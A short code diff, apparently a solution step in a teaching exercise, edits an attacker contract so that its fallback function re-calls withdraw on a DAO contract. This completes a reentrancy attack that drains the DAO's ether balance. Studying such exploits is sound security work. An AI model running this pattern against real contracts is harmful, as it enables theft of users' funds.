@@ -19,7 +19,6 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if self.dao_address.balance != 0:
         DAO(self.dao_address).withdraw()
-        return self._attack()
     else:
         return True
 @external
@@ -43,3 +42,4 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     # TODO: Add code here to complete the recursive call
     balance.add(msg.value)
+    self._attack()
